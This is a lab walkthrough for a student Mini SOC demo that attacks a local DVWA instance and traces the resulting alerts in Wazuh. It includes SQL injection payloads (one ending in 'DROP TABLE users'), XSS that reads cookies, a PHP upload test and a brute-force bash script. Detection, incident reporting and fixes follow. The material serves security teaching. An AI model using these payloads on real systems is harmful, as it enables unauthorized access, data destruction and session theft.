# Demo Flow - Attack-to-Alert Pipeline

Dokumentasi step-by-step untuk menjalankan demonstrasi lengkap Mini SOC dari attack hingga response.

## 📅 Demo Duration

**Total Time: ~20-30 minutes**
- Setup: 5 minutes
- Attacks: 10 minutes
- Analysis & Response: 10-15 minutes

---

## 🚀 Part 1: Environment Setup

### Step 1: Start All Services (5 minutes)

```bash
# Navigate to project directory
cd c:\Users\Abiyyu\Documents\Coding\SOC\MiniSOC\MiniSoC_Kelas-C_032-042-050

# Start all containers
docker-compose up -d

# Wait for services to be ready (takes 2-3 minutes)
docker-compose ps

# Check all services are healthy
docker-compose logs --tail=20
```

**Expected Output:**
```
NAME                    STATUS
soc-dvwa                Up (healthy)
soc-nginx               Up (healthy)
wazuh-manager           Up
wazuh-indexer           Up
wazuh-dashboard         Up
soc-filebeat            Up
```

### Step 2: Verify Services

```bash
# Test DVWA access
curl http://localhost:8080

# Test Nginx health
curl http://localhost/health

# Expected: "healthy" response
```

**Expected Output:**
```
healthy
```

### Step 3: Access Web Interfaces

Open in browser:

1. **DVWA**: http://localhost:8080
   - Username: `admin`
   - Password: `password`
   - Feel free to explore the UI

2. **Wazuh Dashboard**: https://localhost:5601
   - Username: `admin`
   - Password: `SecurePassword123!`
   - Navigate to: Security Events (to see alerts live)

---

## ⚔️ Part 2: Execute Attacks (10 minutes)

Now we'll perform a series of attacks and see them appear as alerts in Wazuh.

### Attack 1: SQL Injection (SQLi) - 3 minutes

**Scenario**: Attacker tries to bypass login by injecting SQL code.

#### 1.1 Access DVWA SQL Injection Page
```
1. Open browser: http://localhost:8080/vulnerabilities/sqli/
2. You'll see "User ID" input field
```

#### 1.2 Execute Basic SQLi Payload

**Payload 1: Authentication Bypass**
```
Input: admin' OR '1'='1
```

```bash
# Or use curl
curl "http://localhost:8080/vulnerabilities/sqli/?id=admin%27%20OR%20%271%27%3D%271"
```

**Expected Result:**
- Browser shows: User records from database (unauthorized!)
- Shows all users: Admin, User, Guest

**What Happened:**
- Query changed from: `SELECT * FROM users WHERE user_id = 'admin'`
- To: `SELECT * FROM users WHERE user_id = 'admin' OR '1'='1'` (always true!)

#### 1.3 Payload 2: UNION-based SQLi

```
Input: 1' UNION SELECT user(),database() --
```

**Expected Result:**
- Shows: MySQL user and database name
- Demonstrates data exfiltration

#### 1.4 Check Nginx Logs

```bash
# View the generated logs
docker-compose exec nginx tail -20 /var/log/nginx/access.log

# Look for the payloads in the logs
```

**Expected Log Entry:**
```
127.0.0.1 - - [25/Apr/2026:10:30:45 +0000] "GET /vulnerabilities/sqli/?id=admin%27%20OR%20%271%27%3D%271 HTTP/1.1" 200 1234 "-" "Mozilla..."
```

### Attack 2: Cross-Site Scripting (XSS) - 3 minutes

**Scenario**: Attacker injects JavaScript to steal user information.

#### 2.1 Access DVWA XSS Page
```
1. Open browser: http://localhost:8080/vulnerabilities/xss_reflected/
2. You'll see "What's your name?" input field
```

#### 2.2 Execute XSS Payload

**Payload 1: Basic Alert**
```
Input: <script>alert('XSS Vulnerability!')</script>
```

**Expected Result:**
- JavaScript alert pops up saying "XSS Vulnerability!"
- Proves script execution is possible

#### 2.3 Payload 2: Cookie Stealer (Educational)

```
Input: <script>alert('Your cookie: ' + document.cookie)</script>
```

**Expected Result:**
- Shows PHPSESSID and other session cookies
- Demonstrates session hijacking risk

#### 2.4 Payload 3: URL-Encoded XSS

```
Input: %3Cscript%3Ealert('Encoded XSS')%3C%2Fscript%3E
```

**Note**: Some browsers auto-decode, some show as text

#### 2.5 Check Nginx Logs

```bash
docker-compose exec nginx tail -10 /var/log/nginx/access.log

# Look for %3Cscript%3E (URL-encoded <script>)
```

### Attack 3: File Upload - 2 minutes

**Scenario**: Attacker uploads malicious PHP file to execute commands.

#### 3.1 Access File Upload Page
```
1. Open browser: http://localhost:8080/vulnerabilities/upload/
2. You'll see file upload form
```

#### 3.2 Create Test File

```bash
# Create test PHP file
echo '<?php echo "File upload successful!"; ?>' > test.php
```

#### 3.3 Upload File

```
1. Click "Choose File"
2. Select test.php
3. Click "Upload"
```

**Expected Result:**
- File uploaded successfully
- Message: "../../hackable/uploads/test.php"

#### 3.4 Access Uploaded File

```bash
curl http://localhost:8080/hackable/uploads/test.php

# Or open in browser:
# http://localhost:8080/hackable/uploads/test.php
```

**Expected Result:**
- Shows: "File upload successful!"
- Proves PHP execution in upload directory (VERY DANGEROUS!)

### Attack 4: Brute Force - 2 minutes

**Scenario**: Attacker tries multiple password combinations.

#### 4.1 Access Brute Force Page
```
1. Open browser: http://localhost:8080/vulnerabilities/brute/
2. Login form with Username and Password fields
```

#### 4.2 Execute Brute Force Attack

**Option A: Manual (Quick test)**
```
Try several times:
Username: admin
Passwords: password, admin, 123456, admin123
```

**Option B: Automated (Using bash)**
```bash
#!/bin/bash
# Simple brute force script

URL="http://localhost:8080/vulnerabilities/brute/"
USER="admin"
PASSWORDS=("password" "admin" "123456" "dvwa" "password123")

for pass in "${PASSWORDS[@]}"; do
  echo "[*] Trying: $USER:$pass"
  curl -s -X POST "$URL" \
    -d "username=$USER&password=$pass&Login=Login" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    | grep -q "Welcome" && echo "[+] SUCCESS: $pass found!" && break
  sleep 1
done
```

**Expected Behavior:**
- Multiple failed login attempts logged
- Correct password: "password"
- After success: "Welcome to the password protected area"

---

## 📊 Part 3: Monitor in Wazuh Dashboard (5 minutes)

### Step 1: Open Wazuh Dashboard

```
https://localhost:5601
Username: admin
Password: SecurePassword123!
```

### Step 2: Check Alerts

Navigate to:
```
Dashboard → Security Events
```

**You should see alerts like:**

1. **SQL Injection Alerts**
   - Rule ID: 100100
   - Severity: CRITICAL (10)
   - Description: "Possible SQL Injection attempt on DVWA"
   - Count: 2-3 alerts (from our payload attempts)

2. **XSS Alerts**
   - Rule ID: 100101
   - Severity: CRITICAL (10)
   - Description: "Possible XSS attempt on DVWA"
   - Count: 2-3 alerts

3. **File Upload Alerts**
   - Rule ID: 100102
   - Severity: MEDIUM (7)
   - Description: "Possible suspicious PHP file upload/access"
   - Count: 1-2 alerts (upload + access)

### Step 3: Drill Down on an Alert

Click on any **SQL Injection alert**:

```
View Alert Details:
├─ Rule Information
│  ├─ Rule ID: 100100
│  ├─ Rule Name: Possible SQL Injection attempt on DVWA
│  └─ Severity: CRITICAL
├─ Log Data
│  ├─ Source IP: 127.0.0.1
│  ├─ Timestamp: 2026-04-25 10:30:45
│  ├─ HTTP Method: GET
│  ├─ URL/URI: /vulnerabilities/sqli/?id=admin' OR '1'='1
│  ├─ Response Code: 200
│  └─ Full Log: [complete request details]
└─ Analysis
   ├─ Attack Type: SQL Injection
   ├─ Target: DVWA User table
   └─ Impact: Possible unauthorized data access
```

### Step 4: Use Filters

Filter alerts by:
```
Rule ID = 100100  (SQL Injection only)
Severity >= 10    (Critical alerts only)
Time = Last 30 min
Status = Any
```

### Step 5: View Attack Timeline

In dashboard:
```
Go to: Agents → DVWA → Events
View: All events in chronological order
```

**Expected Timeline:**
```
10:30:45 - GET /vulnerabilities/sqli/?id=admin' OR '1'='1  → 200 (SQLi Alert!)
10:30:50 - GET /vulnerabilities/sqli/?id=1' UNION SELECT  → 200 (SQLi Alert!)
10:31:15 - GET /vulnerabilities/xss_reflected/?name=<script> → 200 (XSS Alert!)
10:31:45 - POST /vulnerabilities/upload/ [test.php]        → 200 (Upload Alert!)
```

---

## 🔍 Part 4: Analysis & Response (10-15 minutes)

### Step 1: Create Incident Report

Based on the alerts, create incident report:

```markdown
## INCIDENT REPORT - INC-2026-04-25-001

### Summary
Multiple web application attacks detected on DVWA via HTTP requests from 127.0.0.1

### Timeline
- 10:30:45 - SQLi attack attempt #1
- 10:30:50 - SQLi attack attempt #2
- 10:31:15 - XSS attack attempt
- 10:31:45 - File upload attempt

### Attacks Detected
1. SQL Injection (2 attempts)
   - Payload: admin' OR '1'='1
   - Impact: Database table enumeration
   - Status: SUCCESSFUL (200 OK)

2. XSS (1 attempt)
   - Payload: <script>alert('XSS')</script>
   - Impact: Script execution possible
   - Status: SUCCESSFUL

3. File Upload (1 attempt)
   - Payload: test.php
   - Impact: PHP execution in upload dir
   - Status: SUCCESSFUL

### Severity Assessment
- Technical Risk: CRITICAL
- Business Impact: High
- Overall Level: CRITICAL

### Recommended Actions
1. Update input validation
2. Implement prepared statements
3. Add WAF rules
4. Restrict upload directory
5. Enable output encoding
```

### Step 2: Recommended Fixes

**For SQL Injection:**
```php
// Before (Vulnerable):
$query = "SELECT * FROM users WHERE user_id = '" . $_GET['id'] . "'";

// After (Secure):
$stmt = $db->prepare("SELECT * FROM users WHERE user_id = ?");
$stmt->bind_param("s", $_GET['id']);
$stmt->execute();
$result = $stmt->get_result();
```

**For XSS:**
```php
// Before (Vulnerable):
echo "Hello " . $_GET['name'];

// After (Secure):
echo "Hello " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
```

**For File Upload:**
```php
// Before (Vulnerable):
move_uploaded_file($_FILES['file']['tmp_name'], "uploads/" . $_FILES['file']['name']);

// After (Secure):
$allowed = ['jpg', 'png', 'gif'];
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
if (in_array(strtolower($ext), $allowed)) {
    $newname = uniqid() . "." . $ext;
    move_uploaded_file($_FILES['file']['tmp_name'], "uploads/" . $newname);
}
```

### Step 3: Implement Response

**Option 1: Manual Blocking**
```bash
# Add attacker IP to blocklist
echo "127.0.0.1" >> nginx/blocked_ips.conf

# Reload Nginx
docker-compose exec nginx nginx -s reload
```

**Option 2: Update Rules**
```xml
<!-- Add to wazuh/rules/custom_rules.xml -->
<rule id="100110" level="12">
  <if_sid>100100,100101</if_sid>
  <frequency>5 in 1m</frequency>
  <timeframe>60</timeframe>
  <description>Possible advanced attack - Multiple attempts detected</description>
</rule>
```

```bash
# Restart Wazuh Manager
docker-compose restart wazuh-manager
```

### Step 4: Document in Wazuh

In Wazuh Dashboard:
1. Go to the alert
2. Add Comment/Note: "INC-2026-04-25-001: Confirmed SQLi attempt, source IP blocked"
3. Update Status: "In Progress" → "Resolved"

---

## 🔄 Repeat or Extend Demo

### Option 1: Run More Attacks
```bash
# Run all attacks again
bash attack-script.sh  # (if created)

# Or manually repeat steps above
```

### Option 2: Create Custom Attacks

```bash
# Try different payloads
curl "http://localhost:8080/vulnerabilities/sqli/?id=1'; DROP TABLE users; --"

# Test encoding variations
curl "http://localhost:8080/vulnerabilities/xss_reflected/?name=<IMG%20SRC=x%20ONERROR=alert()>"
```

### Option 3: Review Log Retention

```bash
# Check how many alerts accumulated
docker-compose exec wazuh-indexer curl -u admin:SecurePassword123! \
  "https://localhost:9200/wazuh-alerts-*/_count" -k

# View oldest/newest alerts
docker-compose exec wazuh-indexer curl -u admin:SecurePassword123! \
  "https://localhost:9200/wazuh-alerts-*/_search?sort=timestamp:asc&size=1" -k
```

---

## 📋 Checklist - Full Demo

### Pre-Demo
- [ ] All containers running
- [ ] Services healthy
- [ ] DVWA accessible
- [ ] Wazuh Dashboard accessible
- [ ] Nginx logs clean (no old artifacts)

### Demo Execution
- [ ] SQLi Attack 1: Execute payload
- [ ] Verify Nginx logs contain payload
- [ ] Check Wazuh dashboard for SQLi alert
- [ ] SQLi Attack 2: Execute different payload
- [ ] XSS Attack: Execute and verify
- [ ] Check XSS alert in dashboard
- [ ] File Upload: Upload and verify
- [ ] Check upload alert in dashboard
- [ ] Brute Force: Execute attempts
- [ ] Review timeline in dashboard

### Post-Demo
- [ ] Drill down on 3-5 alerts
- [ ] Document findings
- [ ] Create incident report
- [ ] Propose remediation
- [ ] Demonstrate fix implementation

---

## ⏱️ Timing Guide

```
Total Duration: ~25 minutes

Breakdown:
- Setup (services ready):        5 min
- SQLi attacks:                   3 min
- XSS attacks:                    3 min
- File upload:                    2 min
- Brute force:                    2 min
- Monitor in Wazuh:               5 min
- Analysis & response:            5 min
- Q&A / Discussion:               Flexible
```

---

## 🎓 Learning Outcomes

After this demo, you should understand:

1. **Attack-to-Alert Pipeline**: How attacks flow from execution to detection
2. **Log Analysis**: How to interpret security logs
3. **SIEM Operation**: How Wazuh processes and correlates events
4. **Incident Response**: How to respond to security alerts
5. **Remediation**: How to fix vulnerabilities identified in attacks

---

## 🔗 References

- [Demo Video Walkthrough](#) (if recorded)
- [docs/attack-scenario.md](attack-scenario.md) - Detailed attack payloads
- [docs/detection.md](detection.md) - Detection rules explained
- [docs/incident-response.md](incident-response.md) - Full IR procedures
- [README.md](../README.md) - Project overview

---

**Last Updated**: 2026-04-25
